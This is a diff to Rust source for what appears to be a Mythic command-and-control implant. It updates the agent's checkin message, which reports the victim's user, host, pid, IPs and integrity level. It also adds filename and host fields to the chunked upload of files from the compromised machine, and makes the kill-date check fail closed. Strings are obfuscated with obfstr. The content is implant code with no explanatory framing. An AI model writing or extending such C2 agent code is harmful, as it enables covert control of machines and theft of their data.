@@ -86,9 +86,9 @@ pub struct CheckinMessage<'a> {
     pub user: String,
     pub host: String,
     pub pid: u32,
-    pub ip: String,
+    pub ips: Vec<String>,
     pub os: &'a str,
-    pub arch: &'a str,
+    pub architecture: &'a str,
     pub domain: &'a str,
     pub integrity_level: u8,
     pub extra_info: &'a str,
@@ -149,6 +149,10 @@ pub struct DownloadRegistration {
     pub total_chunks: Option<i64>,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub full_path: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub filename: Option<String>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub host: Option<String>,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub chunk_size: Option<usize>,
     #[serde(skip_serializing_if = "Option::is_none")]
@@ -398,9 +402,14 @@ pub fn set_kill_date(ts: Option<i64>) {
 }
 pub fn should_exit() -> bool {
     if let Some(kd) = get_kill_date() {
-        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
-            return now.as_secs() as i64 > kd;
-        }
+        // Fail closed: if the system clock is before UNIX_EPOCH (corrupted,
+        // VM boot without NTP), duration_since errors. Treat that as expired
+        // so a kill date can never be silently bypassed by clock skew.
+        let now_secs = match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
+            Ok(now) => now.as_secs() as i64,
+            Err(_) => return true,
+        };
+        return now_secs > kd;
     }
     false
 }
@@ -641,6 +650,13 @@ pub fn mythic_download(
         download: Some(DownloadRegistration {
             total_chunks: Some(total_chunks),
             full_path: Some(full_path.clone()),
+            filename: Some(
+                std::path::Path::new(&full_path)
+                    .file_name()
+                    .map(|n| n.to_string_lossy().to_string())
+                    .unwrap_or_else(|| full_path.clone()),
+            ),
+            host: Some(portable_hostname()),
             chunk_size: Some(CHUNK_SIZE),
             is_screenshot: Some(false),
             chunk_num: None,
@@ -680,6 +696,8 @@ pub fn mythic_download(
             download: Some(DownloadRegistration {
                 total_chunks: None,
                 full_path: None,
+                filename: None,
+                host: None,
                 chunk_size: None,
                 is_screenshot: None,
                 chunk_num: Some(chunk_num),
@@ -889,15 +907,20 @@ pub fn run_c2_loop<F>(
 
     // ── Checkin ───────────────────────────────────────────────────────────────
     let checkin_action = obfstr::obfstr!("checkin").to_string();
+    let checkin_ips: Vec<String> = if reg.ip.is_empty() || reg.ip == "unknown" {
+        Vec::new()
+    } else {
+        vec![reg.ip.clone()]
+    };
     let checkin = CheckinMessage {
         action: &checkin_action,
         uuid: payload_uuid,
         user: reg.user.clone(),
         host: reg.host.clone(),
         pid: reg.pid,
-        ip: reg.ip,
+        ips: checkin_ips,
         os: reg.os,
-        arch: reg.arch,
+        architecture: reg.arch,
         domain: "",
         integrity_level: reg.integrity_level,
         extra_info: "",
